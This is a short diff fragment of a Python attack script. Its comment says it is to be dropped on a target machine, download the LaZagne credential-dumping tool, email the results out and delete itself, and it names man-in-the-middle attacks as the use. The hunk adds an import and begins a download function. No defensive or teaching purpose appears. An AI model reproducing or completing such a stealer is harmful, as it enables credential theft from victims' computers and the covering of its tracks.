@@ -2,7 +2,7 @@
 
 #Get this file into target machine, run it, and it will download Lazagne.exe, send you an email and delete itself.
 #Use in MiTM-attacks:
-import requests, subprocess, smtplib
+import requests, subprocess, smtplib, os
 
 def download(url):
     get_response = requests.get(url)
